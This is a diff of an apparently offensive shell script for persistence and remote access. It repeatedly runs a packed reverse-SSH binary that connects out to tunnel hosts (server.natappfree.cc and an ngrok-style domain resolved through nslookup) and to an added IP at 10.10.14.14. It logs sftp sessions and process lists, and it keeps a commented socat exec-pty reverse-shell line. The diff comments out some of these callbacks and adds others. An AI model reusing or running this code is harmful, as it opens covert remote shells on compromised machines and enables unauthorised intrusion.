@@ -4,6 +4,9 @@ exec 2>./y2
 exec 3>./z3
 set -x;
 TZ=UTC-8;date;
+rr="10.10.14.14";
+rr1="http://10.10.14.14:30088/";
+
 s1="export PATH=\$PATH:/tmp;TZ=UTC-8;
 uptime;grep NA /etc/os-release 2>&1;
 alias ll='ls -al';
@@ -23,7 +26,7 @@ PS11=\${sp//\\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\\\u\}}
 
 echo '  /tmp/busybox setsid sh -c \"i=0;while [ \\\$i -le 9 ];do i=\\\$((i+1));/tmp/upx_reverse-sshx64.bin -v -b 40044 -p 32787 server.natappfree.cc;done\"'
 "
-#/tmp/busybox setsid sh -c "i=0;while [ \"\$i\" -le 9 ];do i=\$((i+1));/tmp/upx_reverse-sshx64.bin -v -b 40050 -p 32787 server.natappfree.cc;done"
+ 
 
 s2="grep -q sftp-server /proc/\$\$/cmdline&&(
     echo \"[ \$@ ]\$\$ \$PPID\">>non_pil.lrc;ps -ef 2>&1 >>non_pil.lrc;date +%F%T  2>&1 >>non_pil.lrc;cat /proc/\$\$/cmdline>>non_pil.lrc;   
@@ -233,9 +236,11 @@ cd /tmp;
 
     (while true; do
         [ ! -f 0a9.txt ] && break
-       dns_rev77=\$(./busybox nslookup ngrok.xiaomiqiu123.top 114.114.114.114 |grep -v 114.114.114.114  | grep -oP \"(?<=Address:\s).*\d\$\" ); #echo \${dns_rev77};
+       #dns_rev77=\$(./busybox nslookup ngrok.xiaomiqiu123.top 114.114.114.114 |grep -v 114.114.114.114  | grep -oP \"(?<=Address:\s).*\d\$\" ); #
+       echo \${rr};
+       echo ${rr};
         #${soc2} -t5 exec:\"$d1\",pty,stderr,setsid,sigint,sane tcp:\${dns_rev77}:34292;
-       if [ -f /tmp/upx_reverse-sshx64.bin ];then chmod 0777 ./upx_reverse-sshx64.bin;upx_reverse-sshx64.bin -v -b 40044 -p 34292 \${dns_rev77};else sleep 4;continue;fi
+       #if [ -f /tmp/upx_reverse-sshx64.bin ];then chmod 0777 ./upx_reverse-sshx64.bin;upx_reverse-sshx64.bin -v -b 40044 -p 20022 \${rr};else sleep 4;continue;fi
         sleep 9;
     done) &
 "&
@@ -246,6 +251,8 @@ cd /tmp;
 
 
 echo 1234 flag ${rr3};
+
+
 
 
 ./busybox setsid sh -c "#echo \"J${rr1}ZZ\";
@@ -264,11 +271,12 @@ ag_xx() {
 
 
 
-# ./upx_reverse-sshx64.bin -v -b 50050 -p 35857 server.natappfree.cc  &
+ 
 
 
 
 
 if [ ! -z ${sp9} ]; then sleep $sp9; fi
 date;
+
 #[ -z ${sp5} ] && sleep $sp5
